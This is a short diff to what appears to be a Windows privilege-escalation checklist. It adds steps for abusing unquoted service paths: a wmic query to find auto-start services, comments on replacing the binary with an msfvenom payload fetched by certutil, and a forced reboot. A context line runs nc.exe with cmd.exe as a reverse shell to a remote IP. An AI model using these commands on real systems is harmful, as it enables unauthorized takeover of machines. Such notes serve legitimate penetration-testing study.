@@ -22,7 +22,13 @@ runas /user:administrator "C:\users\viewer\desktop\nc.exe -e cmd.exe 192.168.49.
 ```
 - [ ] Check Unqouted Path Service
 ```
+#FIND SERVICE
 wmic service get name,displayname,pathname,startmode |findstr /i "auto"
+
+#CHANGE FILE WITH MSFVENOM PAYLOAD (DOWNLOAD WITH CERTUTIL)
+
+#REBOOT
+shutdown /r
 ```
 
 # SeImpersonatePrivilege
